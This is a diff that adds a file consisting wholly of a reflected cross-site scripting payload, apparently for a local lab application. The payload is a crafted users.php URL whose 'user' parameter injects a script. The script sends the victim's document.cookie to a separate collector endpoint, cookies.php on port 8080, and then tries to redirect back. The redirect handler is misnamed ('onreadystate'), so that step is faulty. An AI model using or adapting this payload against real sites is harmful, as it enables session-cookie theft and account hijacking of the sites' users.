@@ -1,0 +1,10 @@
+http://localhost/barbarbar/users.php?user=">
+<script>
+    var url = "http://localhost:8080/barbarbar/cookies.php?cookie=".concat(document.cookie);
+    var req = new XMLHttpRequest;
+    req.onreadystate = function () {
+            window.location = "http://localhost/barbarbar/users.php";
+        };
+    req.open("GET", url, true);
+    req.send(null);
+</script>
